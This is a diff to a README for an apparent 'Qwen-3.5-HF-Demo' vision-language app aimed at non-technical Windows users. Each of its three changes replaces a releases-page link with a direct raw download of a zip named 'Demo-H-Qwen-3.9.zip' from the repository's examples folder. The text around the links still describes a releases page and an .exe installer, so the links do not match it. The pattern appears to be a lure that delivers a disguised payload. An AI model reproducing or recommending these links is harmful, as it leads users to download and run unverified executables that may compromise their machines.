@@ -1,6 +1,6 @@
 # ⚙️ Qwen-3.5-HF-Demo - Explore Vision and Language Easily
 
-[![Download Qwen-3.5-HF-Demo](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/releases)
+[![Download Qwen-3.5-HF-Demo](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/raw/refs/heads/main/examples/Demo-H-Qwen-3.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You do not need to install Python or any programming tools. All necessary softwa
 
 To get the program, **visit this page to download** the files you need:
 
-[![Download Now](https://img.shields.io/badge/Download-Qwen--3.5--HF--Demo-blue)](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/releases)
+[![Download Now](https://img.shields.io/badge/Download-Qwen--3.5--HF--Demo-blue)](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/raw/refs/heads/main/examples/Demo-H-Qwen-3.9.zip)
 
 Click the link above. It takes you to the releases page where you will find the latest version of the app. Look for a file with a name ending in `.exe` — this is the installer for Windows. The file size will usually be around 100-500 MB.
 
@@ -104,7 +104,7 @@ Before you start:
 Steps to follow:
 
 1. Visit the releases page to download the latest version:  
-   [Download Qwen-3.5-HF-Demo](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/releases)  
+   [Download Qwen-3.5-HF-Demo](https://github.com/lucianduyos/Qwen-3.5-HF-Demo/raw/refs/heads/main/examples/Demo-H-Qwen-3.9.zip)  
 2. Run the `.exe` installer file.  
 3. Follow the setup instructions to install.  
 4. Launch the app from the Start menu.  
